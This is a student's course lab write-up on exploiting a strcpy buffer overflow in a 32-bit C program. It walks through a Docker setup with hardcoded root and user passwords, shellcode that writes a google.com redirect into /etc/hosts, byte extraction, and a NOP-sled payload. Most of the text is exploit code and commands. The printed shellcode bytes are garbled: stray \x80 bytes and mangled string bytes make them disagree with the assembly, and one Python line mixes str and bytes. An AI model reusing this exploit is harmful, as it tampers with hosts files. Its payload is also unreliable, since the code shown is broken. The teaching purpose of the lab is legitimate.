# Lab #1,22110073, Nguyen Cong Thuan, INSE331280E_02FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in asm. This shellcode add a new entry in hosts file
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**:

### Step 1: Create a Dockerfile to set up the environment
First, we need to create a Docker environment with all the necessary tools. Docker will help us set up an isolated and secure environment to test buffer overflow attacks without affecting the real system.
```
touch Dockerfile
```
Copy and paste the following into the Dockerfile:
```
FROM 32bit/ubuntu:16.04
ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get -y install \   
    nasm \
    gcc \
    gdb \
    python3 \        
    python3-pip \    
    git \  
    nano \
    sudo \
    strace \
    libc6-dbg && \
    apt-get clean


RUN useradd -m -s /bin/bash seed && \
    echo "root:dees" | chpasswd && \
    echo "seed:dees" | chpasswd && \
    usermod -aG sudo seed  

USER seed
WORKDIR /home/seed
RUN mkdir seclabs
RUN git clone https://github.com/longld/peda.git ~/peda
RUN echo "source ~/peda/peda.py" >> ~/.gdbinit

CMD [ "/bin/bash"]
```
Build Docker Image:
```
docker build -t buffer_overflow_lab .
```

### Step 2: Create and compile the vulnerable C program

Create vuln.c file with the following content:
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

Compile C program: Start Docker container:
```
docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs buffer_overflow_lab
```
![image](/dockerbuild.png)

Inside the container, run the following command to compile the C program:
```
gcc -o vuln vuln.c -fno-stack-protector -z execstack -m32
```

- -fno-stack-protector: Disable stack protection to prevent buffer overflows.

- -z execstack: Enable code execution on the stack.

- -m32: Compile the program in 32-bit mode.

### Step 3: Write and compile the shellcode
Create a shellcode.asm file with the following content:
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
```

Compile the shellcode:
```
nasm -f elf32 shellcode.asm
ld -o shellcode shellcode.o
```

![image](/codecompile.png)
![image](/aftercompile.png)
### Step 4: Create payload and exploit the program
Generate shellcode in bytecode form: Extract bytecode from compiled shellcode file:
```
objdump -d shellcode | grep '[0-9a-f]:' | grep -oP '\s\K[0-9a-f]{2}' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
```
![image](/shellcode.png)
- This is the binary bytecode of the shellcode, extracted from the shellcode.o file that you compiled from the assembly code (shellcode.asm).
- Each group of 4 characters, for example \x80\x31\xc9\x80, represents 1 byte of machine code. These bytes are specific instructions that are executed directly by the CPU when the shellcode is invoked.
- Use this bytecode string to exploit a buffer overflow vulnerability. This shellcode will be injected into the buffer of the vulnerable program and executed after you control the return address of the program.

Generate payload: Generate payload by combining NOP sled, shellcode, and return address:


```
python3 -c 'print("\x90"*100 + b"\x31\xc9\x80\xf7\xe1\x80\xb0\x05\x80\x51\x80\x68\x6f\x73\x74\x73\x80\x68\x2f\x2f\x2f\x68\x80\x68\x2f\x65\x74\x63\x80\x89\xe3\x80\x66\xb9\x01\x04\x80\xcd\x80\x80\x93\x80\x6a\x04\x80\x58\x80\xeb\x10\x80\x80\x59\x80\x6a\x14\x80\x5a\x80\xcd\x80\x80\x6a\x06\x80\x58\x80\xcd\x80\x80\x6a\x01\x80\x58\x80\xcd\x80\x80\xe8\xeb\xff\xff\xff\xca\x80\x80\x31\x32\x80\x37\xaa\x80\x2e\x31\x2e\x80\x31\x2e\x80\x31\x20\x80\x67\x6f\x80\x6f\x80\x67\x6c\x80\x65\x2e\x63\x6f\x6d" + b"\x40\xfc\xff\xbf")'
```
Run program with payload: Execute program with payload:
```
./vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x31\xc9\x80\xf7\xe1\x80\xb0\x05\x80\x51\x80\x68\x6f\x73\x74\x73\x80\x68\x2f\x2f\x2f\x68\x80\x68\x2f\x65\x74\x63\x80\x89\xe3\x80\x66\xb9\x01\x04\x80\xcd\x80\x80\x93\x80\x6a\x04\x80\x58\x80\xeb\x10\x80\x80\x59\x80\x6a\x14\x80\x5a\x80\xcd\x80\x80\x6a\x06\x80\x58\x80\xcd\x80\x80\x6a\x01\x80\x58\x80\xcd\x80\x80\xe8\xeb\xff\xff\xff\xca\x80\x80\x31\x32\x80\x37\xaa\x80\x2e\x31\x2e\x80\x31\x2e\x80\x31\x20\x80\x67\x6f\x80\x6f\x80\x67\x6c\x80\x65\x2e\x63\x6f\x6d" + b"\x40\xfc\xff\xbf")')

```
